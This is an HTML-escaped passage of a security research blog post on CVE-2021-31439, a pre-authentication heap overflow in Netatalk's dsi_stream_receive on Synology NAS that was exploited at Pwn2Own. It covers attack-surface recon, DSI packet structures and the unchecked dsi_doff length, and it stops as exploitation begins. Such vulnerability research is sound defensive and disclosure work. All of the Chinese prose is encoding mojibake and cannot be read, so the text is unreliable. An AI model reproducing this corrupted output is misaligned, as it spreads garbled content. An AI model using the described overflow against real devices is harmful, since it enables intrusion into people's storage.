&lt;p&gt;ÂâçÂπ¥ÊàëÂÄëÂú® Synology ÁöÑ NAS ‰∏≠ÁôºÁèæ‰∫Ü &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-21-492/&quot;&gt;Pre-auth RCE ÁöÑÊºèÊ¥û(CVE-2021-31439)&lt;/a&gt;Ôºå‰∏¶Âú® Pwn2Own Tokyo ‰∏≠ÂèñÂæó‰∫Ü Synology DS418 play ÁöÑÊéßÂà∂Ê¨äÔºåËÄåÊàêÂäüÁç≤Âæó Pwn2Own ÁöÑÈªûÊï∏ÔºåÂæåÁ∫å‰πüÁôºÁèæÈÄôÂÄãÊºèÊ¥û‰∏çÂè™Â≠òÂú® Synology ÁöÑ NASÔºå‰πüÂêåÊôÇÂ≠òÂú®Â§öÊï∏Âª†ÁâåÁöÑ NAS ‰∏≠ÔºåÈÄôÁØáÁ†îÁ©∂Â∞áË¨õËø∞ÈÄôÊºèÊ¥ûÁöÑÁ¥∞ÁØÄÂèäÊàëÂÄëÁöÑÂà©Áî®ÊñπÂºè„ÄÇ&lt;/p&gt;

&lt;p&gt;Ê≠§‰ªΩÁ†îÁ©∂‰∫¶ÁôºË°®Êñº &lt;a href=&quot;https://hitcon.org/2021/&quot;&gt;HITCON 2021&lt;/a&gt;Ôºå‰Ω†ÂèØ‰ª•Âæû&lt;a href=&quot;https://hitcon.org/2021/agenda/03f06675-261d-4c97-b524-33ef9cc6ccb2/%E4%BD%A0%E7%9A%84%20NAS%20%E4%B8%8D%E6%98%AF%E4%BD%A0%E7%9A%84%20NAS%20!.pdf&quot;&gt;ÈÄôË£°&lt;/a&gt;ÂèñÂæóÊäïÂΩ±ÁâáÔºÅ&lt;/p&gt;

&lt;h2 id=&quot;network-attached-storage&quot;&gt;Network Attached Storage&lt;/h2&gt;

&lt;p&gt;Êó©Êúü NAS ‰∏ÄËà¨Áî®ÈÄîÁÇ∫ËÆì‰º∫ÊúçÂô®Êú¨Ë∫´ËàáË≥áÊñôÂàÜÈñã‰πüÁÇ∫‰∫ÜÂÅöÁï∞Âú∞ÂÇôÊè¥ËÄå‰ΩøÁî®ÁöÑË®≠ÂÇôÔºåÂäüËÉΩ‰∏ä‰∏ªË¶ÅÂñÆÁ¥îËÆì‰ΩøÁî®ËÄÖÂèØ‰ª•Áõ¥Êé•Âú®Á∂≤Ë∑Ø‰∏äÂ≠òÂèñË≥áÊñôÂèäÂàÜ‰∫´Ê™îÊ°àÔºåÁèæ‰ªäÁöÑ NAS Êõ¥ÊòØÊèê‰æõÂ§öÁ®ÆÊúçÂãôÔºå‰∏çÊ≠¢Ê™îÊ°àÂàÜ‰∫´Êõ¥Âä†Êñπ‰æøÔºå‰πüËàá IoT ÁöÑÁí∞Â¢ÉÊõ¥Âä†ÂØÜÂàáÔºå‰æãÂ¶Ç SMB/AFP Á≠âÊúçÂãôÔºåÂèØËºïÊòìÁöÑËÆì‰∏çÂêåÁ≥ªÁµ±ÁöÑÈõªËÖ¶ÂàÜ‰∫´Ê™îÊ°àÔºåÊôÆÂèäÁéá‰πüÈÅ†ÊØî‰ª•ÂâçÈ´òÂæàÂ§ö„ÄÇ&lt;/p&gt;

&lt;p&gt;Áèæ‰ªäÁöÑ NASÔºå‰πüÂèØË£ù‰∏äË®±Â§öÂ•ó‰ª∂ÔºåÊõ¥ÊòØÊúâ‰∏çÂ∞ë‰∫∫Êãø‰æÜÊû∂Ë®≠ ServerÔºåÂú®ÈÄôÊô∫ÊÖßÂÆ∂Â∫≠ÁöÑÂπ¥‰ª£‰∏≠ÔºåÊõ¥ÊòØÊúÉÊúâ‰∏çÂ∞ë‰∫∫Ëàá home assistant ÁµêÂêàÔºå‰ΩøÂæóÁîüÊ¥ªÊõ¥Âä†‰æøÂà©„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;motivation&quot;&gt;Motivation&lt;/h2&gt;

&lt;h3 id=&quot;ÁÇ∫‰ΩïÊàëÂÄëË¶ÅÂéªÁ†îÁ©∂-nas-Âë¢-&quot;&gt;ÁÇ∫‰ΩïÊàëÂÄëË¶ÅÂéªÁ†îÁ©∂ NAS Âë¢ ?&lt;/h3&gt;

&lt;h4 id=&quot;Á¥ÖÈöäÈúÄÊ±Ç&quot;&gt;Á¥ÖÈöäÈúÄÊ±Ç&lt;/h4&gt;
&lt;p&gt;ÈÅéÂéªÂú®ÊàëÂÄëÂúòÈöäÂú®Âü∑Ë°åÁ¥ÖÈöäÈÅéÁ®ã‰∏≠ÔºåNAS ÊôÆÈÅçÊúÉÂá∫ÁèæÂú®‰ºÅÊ•≠ÁöÑÂÖßÁ∂≤‰∏≠ÔºåÊúâÊôÇÊõ¥ÊúÉÊö¥Èú≤Âú®Â§ñÁ∂≤ÔºåÊúâÊôÇÊõ¥ÊúÉÂ≠òÊîæ‰∏çÂ∞ë‰ºÅÊ•≠ÁöÑÊ©üÂØÜË≥áÊñôÂú® NAS ‰∏äÔºåÂõ†Ê≠§ NAS Êº∏Êº∏Ë¢´ÊàëÂÄëÈóúÊ≥®ÔºåÊà∞Áï•ÂÉπÂÄº‰πüÊØî‰ª•ÂæÄÈ´òÂæàÂ§ö„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;ÂãíÁ¥¢ÁóÖÊØí&quot;&gt;ÂãíÁ¥¢ÁóÖÊØí&lt;/h4&gt;
&lt;p&gt;ËøëÂπ¥‰æÜÂõ†ÁÇ∫ NAS Êó•ÁõäÊôÆÂèäÔºåÂ∏∏Ë¢´Êãø‰æÜÊîæÂÄã‰∫∫ÁöÑÈáçË¶ÅË≥áÊñôÔºå‰Ωø NAS ÊàêÁÇ∫‰∫ÜÂãíÁ¥¢ÁóÖÊØíÁöÑÁõÆÊ®ôÔºåÈÄöÂ∏∏Èß≠ÂÆ¢ÁµÑÁπîÈÉΩÊúÉÂà©Áî®ÊºèÊ¥ûÂÖ•‰æµ NAS ÂæåÔºåÂ∞áÂ≠òÊîæÂú® NAS ‰∏≠ÁöÑÊ™îÊ°àÈÉΩÂä†ÂØÜÂæåÂãíÁ¥¢ÔºåËÄå‰ªäÂπ¥Âπ¥ÂàùÊâçÂèàÁàÜÁôº‰∏ÄÊ≥¢ locker Á≥ªÂàóÁöÑ‰∫ã‰ª∂ÔºåÊàëÂÄëÂ∏åÊúõÂèØ‰ª•Ê∏õÂ∞ëÈ°û‰ººÁöÑ‰∫ãÊÉÖÂÜçÊ¨°ÁôºÁîüÔºåÂõ†ËÄåÊèêÈ´ò NAS Á†îÁ©∂ÁöÑÂÑ™ÂÖàÁ®ãÂ∫¶Ôºå‰æÜÂ¢ûÂä† NAS ÂÆâÂÖ®ÊÄß„ÄÇ‰πüÁÇ∫‰∫ÜÊàëÂÄëÂØ¶ÁèæËÆì‰∏ñÁïåÊõ¥ÂÆâÂÖ®ÁöÑÁêÜÊÉ≥„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;pwn2own-mobile-2020&quot;&gt;Pwn2Own Mobile 2020&lt;/h4&gt;
&lt;p&gt;ÊúÄÂæå‰∏ÄÈªûÊòØ NAS Âæû 2020 ÈñãÂßãÔºåÊàêÁÇ∫‰∫Ü Pwn2Own Mobile ÁöÑ‰∏ªË¶ÅÁõÆÊ®ô‰πã‰∏ÄÔºåÂèàÂâõÂ•ΩÂâçÂπ¥ÊàëÂÄë‰πüÊÉ≥ÂòóË©¶ÊåëÊà∞ÁúãÁúã Pwn2Own ÁöÑËàûÂè∞ÔºåÊâÄ‰ª•Ê±∫ÂÆö‰ª• NAS ‰ΩúÁÇ∫Áï∂ÊôÇÁ†îÁ©∂ÁöÑÈ¶ñË¶ÅÁõÆÊ®ôÔºåÂâçÂπ¥ Pwn2Own ÁöÑÁõÆÊ®ôÁÇ∫ Synology Âèä WD ÔºåÁî±Êñº Synology ÁÇ∫Âè∞ÁÅ£‰ºÅÊ•≠Â∏∏Ë¶ãË®≠ÂÇôÔºåÊâÄ‰ª•ÊàëÂÄëÊúÄÂæåÈÅ∏Êìá‰∫Ü Synology ÈñãÂßãÁ†îÁ©∂„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;

&lt;h3 id=&quot;environment&quot;&gt;Environment&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;DS918+&lt;/li&gt;
  &lt;li&gt;DSM 6.2.3-25426&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÊàëÂÄëÁöÑÊ∏¨Ë©¶Áí∞Â¢ÉÊòØ DS918+ Ëàá Pwn2own ÁõÆÊ®ôÊ•µÁÇ∫È°û‰ººÁöÑÂûãËôüÔºåÊàëÂÄëÁÇ∫‰∫ÜÊõ¥‰Ω≥Á¨¶ÂêàÂπ≥Â∏∏ÊúÉÈÅáÂà∞ÁöÑÁí∞Â¢É‰ª•Âèä Pwn2Own ‰∏≠Ë¶ÅÊ±ÇÔºåÊúÉÊòØÂÖ®ÈÉ® default setting ÁöÑÁãÄÊÖã„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;attack-surface&quot;&gt;Attack surface&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;È¶ñÂÖàÂèØÂÖàÁî® netstat Áúã tcp Âíå udp ‰∏≠ÊúâÂì™‰∫õ port ÊòØÂ∞çÂ§ñÈñãÊîæÔºåÂèØ‰ª•ÁúãÂà∞ tcp Âèä udp ‰∏≠ Âú® default Áí∞Â¢É‰∏ãÔºåÂ∞±Èñã‰∫Ü‰∏çÂ∞ëÊúçÂãôÔºåÂÉèÊòØ tcp ÁöÑ smb/nginx/afpd Á≠â&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÄå udp ‰∏≠ÂâáÊúâ minissdpd/findhost/snmpd Á≠âÔºåÂ§öÊï∏ÈÉΩÊòØ‰∏Ä‰∫õÁî®‰æÜÂπ´Âä©Â∞ãÊâæË®≠ÂÇôÁöÑÂçîÂÆö„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÈÄôÈÇäÊåë‰∫ÜÂπæÂÄã Service ÂÅöÂàùÊ≠•ÁöÑÂàÜÊûê&lt;/p&gt;

&lt;h4 id=&quot;dsm-web-interface&quot;&gt;DSM Web interface&lt;/h4&gt;
&lt;p&gt;È¶ñÂÖàÊòØ DSM Web ‰ªãÈù¢ÔºåÊúÄÁõ¥Ë¶∫‰πüÊúÄÁõ¥Êé•ÁöÑ‰∏ÄÈÉ®ÂàÜÔºåÈÄôÈÉ®ÂàÜÂ§ßÊ¶Ç‰πüÊúÉÊòØÊúÄÂ§ö‰∫∫ÂéªÂàÜÊûêÁöÑ‰∏ÄÂ°äÔºåÊúâÊòéÈ°ØÁöÑÂÖ•Âè£ÈªûÔºåÂú®Âè§ËÄÅÊôÇÊúüÂ∏∏Êúâ command injection ÊºèÊ¥ûÔºå‰ΩÜÂæå‰æÜ Synology ÊúâÂö¥Ê†ºË¶èÁØÑÂæåÂæπÂ∫ïÊîπÂñÑÈÄôÂïèÈ°åÔºåÁ®ãÂºè‰πüÊé°Áî®Áõ∏Â∞ç‰øùÂÆàÁöÑÊñπÂºèÈñãÁôºÔºåÁõ∏Â∞çÂÆâÂÖ®‰∏çÂ∞ë„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;smb&quot;&gt;SMB&lt;/h4&gt;
&lt;p&gt;Synology ‰∏≠ÁöÑ SMB ÂçîÂÆöÔºå‰ΩøÁî®ÁöÑÊòØ Open Source ÁöÑ &lt;a href=&quot;https://www.samba.org/&quot;&gt;Samba&lt;/a&gt; ÔºåÂõ†‰ΩøÁî®ÁöÑ‰∫∫ÁúæÂ§öÔºåÈÄ≤Ë°å code review ÂèäÊºèÊ¥ûÊåñÊéòÁöÑ‰∫∫‰πü‰∏çÂ∞ëÔºå‰ΩøÂæóÊØèÂπ¥ÊúÉÊúâ‰∏çÂ∞ëÂ∞èÊ¥ûÔºåËøëÊúüÊúÄÂö¥ÈáçÁöÑÂ∞±ÊòØ &lt;a href=&quot;https://www.samba.org/samba/security/CVE-2017-7494.html&quot;&gt;SambaCry&lt;/a&gt;Ôºå‰ΩÜÁî±ÊñºËºÉÂ§ö‰∫∫Âú® review ÂÆâÂÖ®ÊÄßÁõ∏Â∞ç‰πüÊØîÂÖ∂‰ªñÊúçÂãôÂÆâÂÖ®„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;iscsi-manager&quot;&gt;iSCSI Manager&lt;/h4&gt;
&lt;p&gt;‰∏ªË¶ÅÂçîÂä©‰ΩøÁî®ËÄÖÁÆ°ÁêÜËàáÁõ£Êéß iSCSI ÊúçÂãôÔºåÁî± Synology Ëá™Ë°åÈñãÁôºÔºåËøëÊúüÁÆóÊØîËºÉÂ∏∏Âá∫ÁèæÊºèÊ¥ûÁöÑÂú∞ÊñπÔºå‰ΩÜÈúÄË¶ÅËä±‰∏çÂ∞ëÊôÇÈñì Reverse Ôºå‰∏çÈÅéÊòØÂÄã‰∏çÈåØÁöÑÁõÆÊ®ôÔºåÂ¶ÇÊûúÊ≤íÊúâÂÖ∂‰ªñÊîªÊìäÈù¢ÔºåÂèØËÉΩÊúÉÂÑ™ÂÖàÂàÜÊûê„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;netatalk&quot;&gt;Netatalk&lt;/h4&gt;
&lt;p&gt;ÊúÄÂæå‰∏ÄÂÄãË¶ÅÊèêÁöÑÊòØ Netatalk ‰πüÂ∞±ÊòØ afp ÂçîÂÆöÔºåÂü∫Êú¨‰∏äÊ≤í‰ªÄÈ∫ºÊîπÔºåÂ§ßÈÉ®ÂàÜÊ≤øÁî® open source ÁöÑ NetatalkÔºåËøëÊúüÊúÄÂö¥ÈáçÁöÑÊºèÊ¥ûÁÇ∫ 2018 ÁöÑ Pre-auth RCE (CVE-2018-1160)ÔºåÈóúÊñºÈÄôÊºèÊ¥ûÂèØÂèÉËÄÉ &lt;a href=&quot;https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172&quot;&gt;Exploiting an 18 Year Old Bug&lt;/a&gt; ÔºåNetatalk Áõ∏Â∞çÂÖ∂‰ªñ Service ÈÅéÂéªÁöÑÊºèÊ¥ûÂ∞ëÈùûÂ∏∏Â§öÔºåÊòØÊØîËºÉÂ∞ëË¢´Ê≥®ÊÑèÂà∞ÁöÑ‰∏ÄÂ°äÔºå‰∏¶‰∏îÂ∑≤Á∂ìÈï∑ÊôÇÈñìÊ≤íÂú®Êõ¥Êñ∞Á∂≠Ë≠∑„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÁ∂ìÈÅéÊï¥È´îÂàÜÊûêÂæåÔºå Ë™çÁÇ∫ Netatalk ‰πüÊúÉÊòØ Synology ‰∏≠ÊúÄËªüÁöÑ‰∏ÄÂ°äÔºå‰∏îÊúâ &lt;a href=&quot;http://netatalk.sourceforge.net/&quot;&gt;Source code&lt;/a&gt; ÂèØ‰ª•ÁúãÔºåÊâÄ‰ª•ÊàëÂÄëÊúÄÂæåÊ±∫ÂÆöÂÖàÂàÜÊûê‰ªñ„ÄÇÁï∂ÁÑ∂‰πüÈÇÑÊúâÂÖ∂‰ªñ service Ë∑üÊîªÊìäÈù¢Ôºå‰∏çÈÅéÈÄôÈÇäÁî±ÊñºÁØáÂπÖÂõ†Á¥†Âèä‰∏¶Ê≤íÊúâËä±Â§™Â§öÊôÇÈñìÂéªÁ†îÁ©∂Â∞±‰∏ç‰∏Ä‰∏ÄÂàÜÊûê‰ªãÁ¥π‰∫Ü„ÄÇÊàëÂÄëÈÄôÊ¨°ÁöÑÈáçÈªûÂ∞±Âú®Êñº Netatalk„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;netatalk-1&quot;&gt;Netatalk&lt;/h2&gt;
&lt;p&gt;Apple Filing Protocol (AFP) ÊòØÂÄãÈ°û‰ºº SMB ÁöÑÊ™îÊ°àÂÇ≥Ëº∏ÂçîÂÆöÔºåÊèê‰æõ Mac ‰æÜÂÇ≥Ëº∏ÂèäÂàÜ‰∫´Ê™îÊ°àÔºåÂõ† Apple Êú¨Ë∫´‰∏¶Ê≤íÊúâÈñãÊ∫êÔºåÁÇ∫‰∫ÜËÆì Unlx like ÁöÑÁ≥ªÁµ±‰πüÂèØ‰ª•‰ΩøÁî®ÔºåÊñºÊòØË™ïÁîü‰∫Ü NetatalkÔºåNetatalk ÊòØÂÄãÂØ¶‰Ωú Mac ÁöÑ AFP ÂçîÂÆöÁöÑ OpenSource Â∞àÊ°àÔºåÁÇ∫‰∫ÜËÆì Mac ÂèØ‰ª•Êõ¥Êñπ‰æøÁöÑÁî® NAS ‰æÜÂàÜ‰∫´Ê™îÊ°àÔºåÂπæ‰πéÊØè‰∏ÄÂª†ÁâåÁöÑ NAS ÈÉΩÊúÉ‰ΩøÁî®„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;netatalk-in-synology&quot;&gt;Netatalk in Synology&lt;/h3&gt;
&lt;p&gt;Synology ‰∏≠ÁöÑ netatalk ÊòØÈ†êË®≠ÈñãÂïüÔºåÁâàÊú¨ÊòØÊîπËá™ 3.1.8 ÁöÑ netatalkÔºå‰∏¶‰∏îÊúâÂú®ÂÆöÊúüËøΩËπ§ÂÆâÂÖ®ÊÄßÊõ¥Êñ∞ÔºåÂè™Ë¶ÅÂâõË£ùÂ•ΩÂ∞±ÂèØ‰ª•Áî® afp ÂçîÂÆö‰æÜËàá Synology NAS ÂàÜ‰∫´Ê™îÊ°àÔºåËÄå binary Êú¨Ë∫´‰øùË≠∑Êúâ ASLR/NX/StackGuard„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;dsi&quot;&gt;DSI&lt;/h4&gt;

&lt;p&gt;Ë¨õÊºèÊ¥û‰πãÂâçÔºåÂÖàÂ∏∂Â§ßÂÆ∂‰æÜÁúã‰∏Ä‰∏ã netatalk ‰∏≠ÔºåÈÉ®ÂàÜÈáçË¶ÅÁµêÊßãÔºåÈ¶ñÂÖàÊòØ DSIÔºåNetatalk Âú®ÈÄ£Á∑öÊôÇÊòØ‰ΩøÁî®ÁöÑ DSI (Data Stream interface) ‰æÜÂÇ≥ÈÅûË≥áË®äÔºåServer Ë∑ü Client ÈÉΩÊòØÈÄöÈÅé DSI ÈÄôÂÄãÂçîÂÆö‰æÜÊ∫ùÈÄöÔºåÊØèÂÄã connection ÁöÑ packet ÈÉΩÊúÉÊúâ DSI ÁöÑ header Âú® packet ÂâçÈù¢&lt;/p&gt;

&lt;p&gt;DSI Packet Header :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;DSI Â∞ÅÂåÖ‰∏≠ÂÖßÂÆπÂ§ßËá¥‰∏äÊúÉÂ¶Ç‰∏äÂúñÊâÄÁ§∫ÔºåÊúÉÊúâ Flag/Command Á≠âÁ≠â metadata ‰ª•Âèä payload ÈÄöÂ∏∏Â∞±ÊúÉÊòØ‰∏ÄÂÄã DSI Header + payload ÁöÑÁµêÊßã&lt;/p&gt;

&lt;p&gt;AFP over DSI :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;afp ÂçîÂÆöÁöÑÈÄöË®äÈÅéÁ®ãÂ§ßÊ¶ÇÂ¶Ç‰∏äÂúñÊâÄÁ§∫Ôºå‰ΩøÁî® AFP ÊôÇÔºåclient ÊúÉÂÖàÂéªÊãø server Ë≥áË®äÔºå‰æÜÁ¢∫ÂÆöÊúâÂì™‰∫õË™çË≠âÁöÑÊñπÂºèÈÇÑÊúâ‰ΩøÁî®ÁöÑÁâàÊú¨Á≠âÁ≠âË≥áË®äÔºåÈÄôÂÄãÈÉ®ÂàÜÂèØ‰ª•‰∏çÂÅöÔºåÁÑ∂ÂæåÊúÉÂéª Open Session ‰æÜÔºåÈñãÂïüÊñ∞ÁöÑ SessionÔºåÊé•ËëóÂ∞±ÂèØ‰ª•Âü∑Ë°å AFP ÁöÑ command Ôºå‰ΩÜÂú®Êú™Ë™çË≠â‰πãÂâçÔºåÂè™ÂèØ‰ª•ÂÅöÁôªÂÖ•Ë∑üÁôªÂá∫Á≠âÁõ∏ÈóúÊìç‰ΩúÔºåÊàëÂÄëÂøÖÈ†àÁî® login ÂéªÈ©óË≠â‰ΩøÁî®ËÄÖË∫´‰ªΩÔºåÂè™Ë¶ÅÊ¨äÈôêÊ≤íÂïèÈ°åÊé•‰∏ã‰æÜÂ∞±ÂèØÂÉè SMB ‰∏ÄÊ®£ÂÅöÊ™îÊ°àÊìç‰Ωú&lt;/p&gt;

&lt;p&gt;Âú® Netatalk ÂØ¶‰Ωú‰∏≠ÔºåÊúÉÁî® dsi_block ‰ΩúÁÇ∫Â∞ÅÂåÖÁöÑÁµêÊßã&lt;/p&gt;

&lt;p&gt;dsi_block :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;dsi_flag Â∞±ÊòØÊåáË©≤ packet ÊòØ request or reply&lt;/li&gt;
  &lt;li&gt;dsi_command Ë°®Á§∫ÊàëÂÄëÁöÑ request Ë¶ÅÂÅöÁöÑ‰∫ãÊÉÖ
    &lt;ul&gt;
      &lt;li&gt;DSICloseSession&lt;/li&gt;
      &lt;li&gt;DSICommand&lt;/li&gt;
      &lt;li&gt;DSIGetStatus&lt;/li&gt;
      &lt;li&gt;DSIOpenSession&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_code
    &lt;ul&gt;
      &lt;li&gt;Error code&lt;/li&gt;
      &lt;li&gt;For reply&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_doff
    &lt;ul&gt;
      &lt;li&gt;DSI data offset&lt;/li&gt;
      &lt;li&gt;Using in DSIWrite&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_len
    &lt;ul&gt;
      &lt;li&gt;The Length of Payload&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;DSI : A descriptor of dsi stream&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú® netatalk ‰∏≠ÔºåÈô§‰∫ÜÂéüÂßãÂ∞ÅÂåÖÁµêÊßãÂ§ñÔºå‰πüÊúÉÂ∞áÂ∞ÅÂåÖÂèäË®≠ÂÆöÊ™î parse ÂÆåÂæåÔºåÂ∞áÂ§ßÈÉ®ÂàÜÁöÑË≥áË®äÔºåÂ≠òÊîæÂà∞Âè¶Â§ñ‰∏ÄÂÄãÂêçÁÇ∫ DSI ÁµêÊßã‰∏≠Ôºå‰æãÂ¶Ç server_quantum Âèä payload ÂÖßÂÆπÁ≠âÔºå‰ª•‰æøÂæåÁ∫åÁöÑÊìç‰Ωú„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÄåÂ∞ÅÂåÖ‰∏≠ÁöÑ Payload ÊúÉÂ≠òÊîæÂú® DSI ‰∏≠ command ÁöÑ buffer ‰∏≠ÔºåË©≤ buffer Â§ßÂ∞èÔºåÂèñËá™Êñº server_quantumÔºåË©≤Êï∏ÂÄºÂâáÊòØÂèñËá™Êñº afp ÁöÑË®≠ÂÆöÊ™î afp.conf ‰∏≠„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Â¶ÇÊûúÊ≤íÁâπÂà•Ë®≠ÂÆöÔºåÂâáÊúÉÂèñÁî® default Â§ßÂ∞è 0x100000„ÄÇ&lt;/p&gt;

&lt;p&gt;Êúâ‰∫ÜÂàùÊ≠•‰∫ÜËß£ÂæåÔºåÊàëÂÄëÂèØ‰ª•Ë¨õË¨õÊºèÊ¥û„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÁôºÁèæÁöÑÊºèÊ¥ûÂ∞±ÁôºÁîüÂú®ÔºåÂü∑Ë°å dsi command ÊôÇÔºåËÆÄÂèñ payload ÂÖßÂÆπÁôºÁîü‰∫Ü overflowÔºåÊ≠§ÊôÇ‰∏¶‰∏çÈúÄÁôªÂÖ•Â∞±ÂèØ‰ª•Ëß∏Áôº„ÄÇÂïèÈ°åÂáΩÂºèÊòØÂú® dsi_stream_receive&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄôÊòØ‰∏ÄÂÄãÂ∞áÊé•Êî∂Âà∞Â∞ÅÂåÖÁöÑË≥áË®ä parse ÂæåÊîæÂà∞ DSI ÁµêÊßãÁöÑ functionÔºåÈÄôÂÄã function Êé•Êî∂Â∞ÅÂåÖË≥áÊñôÊôÇÔºåÊúÉÂÖàÊ†πÊìö header ‰∏≠ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_len&lt;/code&gt; ‰æÜÊ±∫ÂÆöË¶ÅËÆÄÂ§öÂ∞ëË≥áÊñôÂà∞ command buffer ‰∏≠ÔºåËÄå‰∏ÄÈñãÂßãÊúâÈ©óË≠â&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_cmdlen&lt;/code&gt; ‰∏çÂèØË∂ÖÈÅé server quantum ‰πüÂ∞±ÊòØ command buffer Â§ßÂ∞è„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÁÑ∂ËÄåÂ¶Ç‰∏äÂúñÈªÉÂå°ËôïÔºåÂ¶ÇÊûúÊúâÁµ¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_doff&lt;/code&gt; ÔºåÂâáÊúÉÂ∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_doff&lt;/code&gt; ‰ΩúÁÇ∫ cmdlen Â§ßÂ∞èÔºå‰ΩÜÈÄôÈÇäÂçªÊ≤íÂéªÊ™¢Êü•ÊòØÂê¶ÊúâË∂ÖÈÅé command buffer„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰ΩøÂæó &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_strem_read&lt;/code&gt; ‰ª•ÈÄôÂÄãÂ§ßÂ∞è‰æÜËÆÄÂèñ paylaod Âà∞ command buffer ‰∏≠ÔºåÊ≠§ÊôÇ command buffer Â§ßÂ∞èÁÇ∫ 0x100000ÔºåÂ¶ÇÊûú &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_doff&lt;/code&gt; Â§ßÂ∞èË∂ÖÈÅé 0x100000 Â∞±ÊúÉÁôºÁîü heap overflow„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;Áî±ÊñºÊòØ heap overflowÔºåÊâÄ‰ª•ÊàëÂÄëÈÄôÈÇäÂøÖÈ†àÂÖàÁêÜËß£ heap ‰∏äÊúâ‰ªÄÈ∫ºÊù±Ë•øÂèØ‰ª•Âà©Áî®ÔºåÂú® DSM ‰∏≠ÁöÑ Netatalk ÊâÄ‰ΩøÁî®ÁöÑ Memory Allocator ÊòØ glibc 2.20ÔºåËÄåÂú® glibc ‰∏≠ÔºåÁï∂ malloc Â§ßÂ∞èË∂ÖÈÅé 0x20000 ÊôÇÔºåÂ∞±ÊúÉ‰ΩøÁî® mmap ‰æÜÂàÜÈÖçË®òÊÜ∂È´îÁ©∫ÈñìÔºåËÄåÊàëÂÄëÂú® netatalk ÊâÄ‰ΩøÁî®ÁöÑÂ§ßÂ∞èÂâáÊòØ 0x100000 Ë∂ÖÈÅé 0x20000 Âõ†Ê≠§ÊúÉÁî® mmap ‰æÜÂàÜÈÖçÊàëÂÄëÁöÑ command buffer„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

